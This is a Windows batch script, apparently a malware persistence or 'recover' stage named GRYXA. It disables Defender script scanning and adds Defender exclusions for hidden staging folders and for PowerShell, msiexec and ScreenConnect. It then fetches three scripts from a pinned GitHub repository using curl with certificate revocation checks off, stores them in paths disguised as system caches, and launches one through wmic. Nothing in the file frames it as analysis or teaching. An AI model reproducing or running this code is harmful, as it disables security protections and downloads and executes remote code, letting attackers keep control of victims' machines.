@echo off
rem RECOVER_GRYXA ??? AMSI-proof host recover (no powershell). Pin 6853b99+ / M56.
setlocal
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=2af944c"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ETL%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "powershell.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_gryxa.cmd" >nul 2>&1
del /f /q "%WD%\gryxa_heal.flag" "%WD%\gryxa_msi.lock" "%STAGE%\own_mon.next" >nul 2>&1

"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_mon.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 40 -o "%WD%\own_gryxa.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_gryxa.cmd?t=%RANDOM%"
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1

findstr /C:"MONVER=" "%WD%\own_mon.cmd"
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd"

> "%STAGE%\gryxa_heal_once.cmd" (
  echo @echo off
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" HEAL ^>^>"%WD%\own_mon.log" 2^>^&1
)
wmic process call create "cmd.exe /c %STAGE%\gryxa_heal_once.cmd"
echo QUEUED heal pin=%PIN%
endlocal
